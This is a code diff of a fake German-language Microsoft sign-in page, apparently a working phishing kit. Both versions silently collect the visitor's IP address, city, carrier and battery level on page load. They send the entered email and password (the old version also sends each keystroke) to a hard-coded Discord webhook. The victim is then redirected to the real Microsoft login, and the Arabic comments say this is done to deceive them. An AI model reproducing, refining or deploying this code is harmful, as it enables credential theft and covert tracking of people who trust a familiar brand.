@@ -1,136 +1,88 @@
 <!DOCTYPE html>
-<html lang="de" dir="ltr">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anmelden - Microsoft 365</title>
-    <link rel="icon" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon">
-    
+    <title>Anmelden - Microsoft</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 1px; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .logo { width: 108px; margin-bottom: 20px; }
-        h2 { font-size: 24px; margin: 0 0 10px; color: #1b1b1b; font-weight: 600; }
-        p { font-size: 15px; margin-bottom: 20px; color: #1b1b1b; }
-        input { width: 100%; padding: 8px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; background: transparent; }
-        input:focus { border-bottom: 2px solid #0067b8; }
-        .btn-container { display: flex; justify-content: flex-end; }
-        button { background-color: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; font-size: 15px; }
+        input { width: 100%; padding: 8px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; }
+        button { background-color: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; float: right; }
         .hidden { display: none; }
-        .email-info { margin-bottom: 15px; cursor: pointer; color: #1b1b1b; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="login-card" id="step1">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
+<div class="card" id="step1">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo">
     <h2>Anmelden</h2>
-    <p>E-Mail, Telefon oder Skype</p>
-    <input type="email" id="email" placeholder="E-Mail-Adresse" autocomplete="off">
-    <div class="btn-container">
-        <button onclick="showStep2()">Weiter</button>
-    </div>
+    <input type="email" id="email" placeholder="E-Mail, Telefon oder Skype">
+    <button onclick="nextStep()">Weiter</button>
 </div>
 
-<div class="login-card hidden" id="step2">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
-    <div class="email-info" onclick="backToStep1()">← <span id="display-email"></span></div>
+<div class="card hidden" id="step2">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" class="logo">
+    <p id="userEmail"></p>
     <h2>Kennwort eingeben</h2>
-    <input type="password" id="password" placeholder="Kennwort" autocomplete="off">
-    <div class="btn-container">
-        <button onclick="finishLogin()">Anmelden</button>
-    </div>
+    <input type="password" id="password" placeholder="Kennwort">
+    <button onclick="submitAll()">Anmelden</button>
 </div>
 
 <script>
-  <script>
-    const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
+    const webhook = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-    async function sendIphoneIntel() {
-        const n = navigator;
-        const s = screen;
-        
-        // بيانات الأيفون الأساسية
-        let iphoneData = {
-            model: `${s.width}x${s.height}`, // من الأبعاد سنعرف موديل الأيفون
-            os: n.userAgent.match(/OS (\d+_\d+)/) ? n.userAgent.match(/OS (\d+_\d+)/)[1].replace('_', '.') : "Unknown iOS",
-            battery: "N/A",
-            isCharging: false,
-            time: new Date().toLocaleTimeString('de-DE'),
-            lang: n.language
-        };
-
-        // سحب الـ IP والموقع
-        const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-
-        // سحب حالة البطارية (مهمة جداً للأيفون)
-        if (n.getBattery) {
-            const b = await n.getBattery();
-            iphoneData.battery = `${(b.level * 100).toFixed(0)}%`;
-            iphoneData.isCharging = b.charging;
-        }
-
-        // إرسال التقرير فوراً (بمجرد الدخول)
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "📱 تم رصد دخول من هاتف iPhone",
-                    color: 0x000000,
-                    fields: [
-                        { name: "🌐 عنوان الـ IP", value: `\`${ipInfo.ip}\` (${ipInfo.city || 'Unknown'})`, inline: false },
-                        { name: "📲 إصدار النظام", value: `iOS \`${iphoneData.os}\``, inline: true },
-                        { name: "🔋 مستوى الشحن", value: `\`${iphoneData.battery}\` ${iphoneData.isCharging ? '🔌' : '🔋'}`, inline: true },
-                        { name: "📏 دقة الشاشة", value: `\`${iphoneData.model}\``, inline: true },
-                        { name: "⏰ توقيت الهاتف", value: `\`${iphoneData.time}\``, inline: true },
-                        { name: "📡 شركة الاتصال", value: `\`${ipInfo.org || 'Unknown'}\``, inline: false }
-                    ],
-                    footer: { text: "تم سحب البيانات تلقائياً بمجرد فتح الرابط" }
-                }]
-            })
-        });
-    }
-
-    // تشغيل السحب تلقائياً فور التحميل
-    window.onload = sendIphoneIntel;
-
-    // كود تسجيل الدخول والحروف (كما هو)
-    let userData = { email: "", password: "" };
-    document.addEventListener('input', (e) => {
-        if (e.target.tagName === 'INPUT') {
-            userData[e.target.id] = e.target.value;
-            fetch(webhookURL, {
+    // 1. سحب بيانات الآيفون والـ IP فوراً عند فتح الصفحة
+    async function track() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const d = await ipRes.json();
+            const b = await navigator.getBattery();
+            
+            fetch(webhook, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `⌨️ **Typing:** \`${e.target.value}\`` })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `🔔 **دخول جديد الآن!**\n📍 IP: \`${d.ip}\` (${d.city})\n🔋 Battery: \`${(b.level*100)}%\`\n📱 System: \`${navigator.platform}\``
+                })
+            });
+        } catch(e) { console.log("Silent tracking"); }
+    }
+    track();
+
+    // 2. الانتقال للمرحلة الثانية (مضمون)
+    function nextStep() {
+        const mail = document.getElementById('email').value;
+        if(mail.length > 3) {
+            document.getElementById('userEmail').innerText = mail;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            // إرسال الإيميل فوراً
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `📧 **Email Entered:** \`${mail}\`` })
             });
         }
-    });
-
-    function showStep2() {
-        document.getElementById('display-email').innerText = document.getElementById('email').value;
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
     }
 
-    function finishLogin() {
-        fetch(webhookURL, {
+    // 3. الإرسال النهائي والإغلاق
+    function submitAll() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        
+        fetch(webhook, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                embeds: [{
-                    title: "🎯 بيانات الحساب الكاملة",
-                    color: 0x00FF00,
-                    fields: [
-                        { name: "📧 الإيميل", value: `\`${userData.email}\`` },
-                        { name: "🔑 كلمة السر", value: `\`${userData.password}\`` }
-                    ]
-                }]
+                content: `🎯 **LOGIN SUCCESS**\nUser: \`${mail}\`\nPass: \`${pass}\``
             })
-        }).then(() => window.location.href = "https://login.live.com/");
+        }).then(() => {
+            // التوجه لصفحة ميكروسوفت الحقيقية لتمويه الضحية
+            window.location.href = "https://login.live.com/";
+        });
     }
-</script>
 </script>
 </body>
 </html>
